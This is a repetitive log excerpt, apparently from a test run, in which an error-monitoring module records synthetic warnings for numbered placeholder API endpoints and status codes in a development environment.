WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.714971Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 578'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_78[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m578[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715020Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 579'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_79[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m579[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715068Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 580'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_80[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m580[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715117Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 581'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_81[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m581[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715167Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 582'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_82[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m582[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715215Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 583'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_83[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m583[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715264Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 584'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_84[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m584[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715314Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 585'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_85[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m585[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715364Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 586'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_86[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m586[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715412Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 587'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_87[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m587[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715461Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 588'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_88[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m588[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715509Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 589'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_89[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m589[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715557Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 590'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_90[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m590[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715605Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 591'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_91[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m591[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715653Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 592'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_92[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m592[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715701Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 593'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_93[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m593[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715749Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 594'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_94[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m594[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715797Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 595'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_95[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m595[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715845Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 596'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_96[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m596[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715892Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 597'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_97[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m597[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715939Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 598'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_98[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m598[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.715987Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m12[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 599'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_99[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m599[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716035Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 600'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_0[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m400[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716084Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 601'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_1[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m401[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716133Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 602'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_2[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m402[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716234Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 603'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_3[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m403[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716304Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 604'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_4[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m404[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716359Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 605'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_5[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m405[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716411Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 606'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_6[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m406[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716462Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 607'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_7[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m407[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716512Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 608'[0m [36merror_type[0m=[35merror_type_8[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_8[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m408[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716560Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 609'[0m [36merror_type[0m=[35merror_type_9[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_9[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m409[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716610Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 610'[0m [36merror_type[0m=[35merror_type_10[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_10[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m410[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716659Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 611'[0m [36merror_type[0m=[35merror_type_11[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_11[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m411[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716709Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 612'[0m [36merror_type[0m=[35merror_type_12[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_12[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m412[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716758Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 613'[0m [36merror_type[0m=[35merror_type_13[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_13[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m413[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716807Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 614'[0m [36merror_type[0m=[35merror_type_14[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_14[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m414[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716855Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 615'[0m [36merror_type[0m=[35merror_type_15[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_15[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m415[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716903Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 616'[0m [36merror_type[0m=[35merror_type_16[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_16[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m416[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.716952Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m13[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 617'[0m [36merror_type[0m=[35merror_type_17[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_17[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m417[0m
